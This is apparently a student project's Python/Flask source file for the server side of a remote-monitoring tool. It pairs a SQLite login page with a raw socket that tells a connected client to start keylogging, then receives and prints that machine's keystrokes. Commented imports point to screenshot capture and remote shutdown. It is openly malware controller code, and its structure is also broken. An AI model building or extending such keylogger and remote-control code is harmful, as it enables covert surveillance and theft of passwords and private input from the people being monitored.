import socket
from flask import Flask, request, render_template, Response
import sqlite3
import os
import threading


# from server.parent import keyLogger
# from server.receiveImageScreen import screenshots as parent_screenshots
# from server.remoteControl import shutdown_computer, restart_computer

port = 8000
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.bind(('', port))
serverSocket.listen(5)
clientSocket, clientAddress = serverSocket.accept()
print('Got connection from', clientAddress)

app = Flask(__name__) 


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']

        # Kết nối đến cơ sở dữ liệu SQLite
        conn = sqlite3.connect('PBL.db')
        cursor = conn.cursor()

        # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
        query = "SELECT * FROM user WHERE username = ? AND password = ?"
        try:
            # Thực hiện truy vấn SQL để kiểm tra tên người dùng và mật khẩu
            cursor.execute(query, (username, password))

            # Kiểm tra xem có người dùng hợp lệ trong cơ sở dữ liệu không
            user = cursor.fetchone()

            # Đóng kết nối đến cơ sở dữ liệu
            conn.close()

            if user:
                return render_template('index.html')


            else:
                return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."
        
        except Exception as e:
            return "Đã xảy ra lỗi: " + str(e)

    return render_template('login.html')


@app.route('/keylogger')
def keyLogger_route():
    clientSocket.send('keylogger'.encode())

while True:
    data = clientSocket.recv(1024)
    if not data:
        break
    data = data.decode('utf-8')
    data = data.replace("'b'", "")
    data = data.replace("'", "")
    
    if data == "Key.backspace":
        data = "back"
    elif data == "Key.f12":
        break
    else:
        if data == "Key.shift":
            data = ""
        if data == "Key.ctrl_l":
            data = ""
        if data == "Key.alt_l":
            data = ""
        if data == "Key.tab":
            data = "\t"
        if data == "Key.enter":
            data = "\n"
        if data == "Key.space":
            data = "_"
    print(data, end="")

    # return render_template('keylogger.html')
